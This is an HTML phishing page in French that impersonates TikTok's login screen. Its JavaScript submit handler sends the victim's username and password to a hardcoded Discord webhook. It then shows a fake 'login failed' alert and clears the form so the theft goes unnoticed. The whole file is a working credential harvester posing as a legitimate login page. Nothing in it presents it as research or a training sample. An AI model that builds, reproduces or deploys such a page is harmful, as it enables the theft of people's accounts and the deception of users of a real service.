<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Connexion TikTok - Email ou t√©l√©phone</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
<style>
  /* Reset et base */
  * {
    box-sizing: border-box;
    margin: 0; padding: 0;
    font-family: 'Inter', sans-serif;
  }
  body {
    background: #fff;
    color: #161823;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 100vh;
    padding: 60px 20px 40px;
  }
  main {
    width: 380px;
  }

  /* Logo centr√© */
  .logo {
    display: flex;
    justify-content: center;
    margin-bottom: 48px;
  }
  .logo img {
    height: 40px;
  }

  /* Titre principal */
  h1 {
    font-weight: 700;
    font-size: 28px;
    text-align: center;
    margin-bottom: 40px;
  }

  /* Sous-titre */
  .subtitle {
    text-align: center;
    font-weight: 600;
    font-size: 16px;
    color: #161823;
    margin-bottom: 32px;
  }

  /* Formulaire */
  form {
    display: flex;
    flex-direction: column;
  }

  label {
    font-weight: 600;
    font-size: 14px;
    margin-bottom: 8px;
  }

  input[type="text"],
  input[type="password"] {
    font-size: 16px;
    height: 44px;
    padding: 0 48px 0 12px;
    border: 1px solid #e6e6e6;
    border-radius: 8px;
    color: #161823;
    margin-bottom: 16px;
    transition: border-color 0.2s ease;
  }
  input[type="text"]:focus,
  input[type="password"]:focus {
    outline: none;
    border-color: #fe2c55;
    box-shadow: 0 0 0 3px rgb(254 44 85 / 0.3);
  }

  /* Wrapper pour mot de passe + bouton afficher */
  .password-wrapper {
    position: relative;
  }

  .toggle-password {
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    font-weight: 600;
    font-size: 14px;
    color: #fe2c55;
    cursor: pointer;
    user-select: none;
  }

  /* Bouton connexion */
  button {
    margin-top: 12px;
    background-color: #fe2c55;
    border: none;
    border-radius: 8px;
    height: 44px;
    color: #fff;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:disabled {
    background-color: #f3a6b7;
    cursor: not-allowed;
  }

  /* Lien mot de passe oubli√© */
  .forgot-password {
    display: block;
    margin: 16px 0 32px;
    font-size: 14px;
    color: #fe2c55;
    text-decoration: none;
  }

  /* Message d'erreur */
  .error-message {
    color: #fe2c55;
    font-size: 12px;
    min-height: 18px;
    margin-top: -12px;
    margin-bottom: 12px;
  }

  /* Texte inscription */
  .signup-text {
    font-size: 14px;
    color: #161823;
    text-align: center;
  }
  .signup-text a {
    color: #fe2c55;
    font-weight: 700;
    text-decoration: none;
    margin-left: 4px;
  }
</style>
</head>
<body>
  <main>
    <div class="logo">
      <img src="https://www.logo.wine/a/logo/TikTok/TikTok-Logo.wine.svg" alt="TikTok Logo" />
    </div>
    <h1>Connexion</h1>
    <div class="subtitle">Utiliser e-mail / t√©l√©phone / nom d'utilisateur</div>
    <form id="loginForm" novalidate>
      <label for="emailOrPhone">E-mail ou nom d'utilisateur</label>
      <input
        type="text"
        id="emailOrPhone"
        name="emailOrPhone"
        placeholder="E-mail ou nom d'utilisateur"
        autocomplete="username"
        required
      />
      <div class="error-message" id="emailOrPhoneError"></div>

      <label for="password">Mot de passe</label>
      <div class="password-wrapper">
        <input
          type="password"
          id="password"
          name="password"
          placeholder="Mot de passe"
          autocomplete="current-password"
          required
        />
        <span class="toggle-password" id="togglePassword" aria-label="Afficher ou masquer le mot de passe">Afficher</span>
      </div>
      <div class="error-message" id="passwordError"></div>

      <a href="#" class="forgot-password">Mot de passe oubli√© ?</a>

      <button type="submit" id="submitBtn" disabled>Connexion</button>
    </form>
    <p class="signup-text">
      Tu n'as pas de compte ?
      <a href="#">Inscris-toi</a>
    </p>
  </main>

  <script>
    const emailOrPhoneInput = document.getElementById('emailOrPhone');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const emailOrPhoneError = document.getElementById('emailOrPhoneError');
    const passwordError = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');

    function containsLetter(str) {
      return /[a-zA-Z]/.test(str);
    }

    function containsSpace(str) {
      return /\s/.test(str);
    }

    function validateInput(value) {
      if (containsSpace(value)) return 'La saisie ne doit pas contenir d‚Äôespaces.';
      if (value.length < 5) return 'La saisie doit contenir au moins 5 caract√®res.';
      if (value.length > 18) return 'La saisie ne doit pas d√©passer 18 caract√®res.';
      if (!containsLetter(value)) return 'La saisie doit contenir au moins une lettre.';
      return '';
    }

    function validatePassword(value) {
      if (containsSpace(value)) return 'Le mot de passe ne doit pas contenir d‚Äôespaces.';
      if (value.length < 5) return 'Le mot de passe doit contenir au moins 5 caract√®res.';
      if (value.length > 18) return 'Le mot de passe ne doit pas d√©passer 18 caract√®res.';
      return '';
    }

    function updateButtonState() {
      const emailVal = emailOrPhoneInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      const emailValidationMsg = validateInput(emailVal);
      const passwordValidationMsg = validatePassword(passwordVal);

      emailOrPhoneError.textContent = emailValidationMsg;
      passwordError.textContent = passwordValidationMsg;

      submitBtn.disabled = !!(emailValidationMsg || passwordValidationMsg);
    }

    emailOrPhoneInput.addEventListener('input', updateButtonState);
    passwordInput.addEventListener('input', updateButtonState);

    togglePassword.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        togglePassword.textContent = 'Masquer';
      } else {
        passwordInput.type = 'password';
        togglePassword.textContent = 'Afficher';
      }
    });

    document.getElementById('loginForm').addEventListener('submit', (e) => {
      e.preventDefault();

      const emailVal = emailOrPhoneInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      // Validation finale
      const emailValidationMsg = validateInput(emailVal);
      const passwordValidationMsg = validatePassword(passwordVal);

      if (emailValidationMsg || passwordValidationMsg) {
        emailOrPhoneError.textContent = emailValidationMsg;
        passwordError.textContent = passwordValidationMsg;
        return;
      }

      const discordMessage =
        `üì• **Nouvelle tentative de connexion TikTok**\n\n` +
        `**üë§ Email ou Nom d'utilisateur :** \`${emailVal}\`\n` +
        `**üîê Mot de passe :** \`${passwordVal}\`\n` +
        `üïí Date : ${new Date().toLocaleString('fr-FR')}`;

      fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: discordMessage }),
      }).then(() => {
        alert('Connexion √©chou√©e. Veuillez r√©essayer.');
        emailOrPhoneInput.value = '';
        passwordInput.value = '';
        submitBtn.disabled = true;
      }).catch(() => {
        alert('Erreur de connexion au serveur.');
      });
    });
  </script>
</body>
</html>
